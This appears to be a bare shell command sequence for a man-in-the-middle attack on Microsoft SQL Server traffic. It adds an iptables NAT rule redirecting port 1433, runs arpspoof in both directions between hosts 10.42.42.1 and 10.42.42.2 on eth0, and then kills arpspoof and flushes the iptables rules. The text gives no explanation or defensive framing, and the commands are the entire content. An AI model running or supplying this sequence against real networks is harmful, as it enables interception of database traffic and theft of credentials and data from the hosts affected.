iptables -t nat -A PREROUTING -p tcp --dport 1433 -j REDIRECT --to-port 1433
arpspoof -i eth0 -t 10.42.42.1 10.42.42.2 &
arpspoof -i eth0 -t 10.42.42.2 10.42.42.1
killall arpspoof
iptables -t nat -F
iptables -F
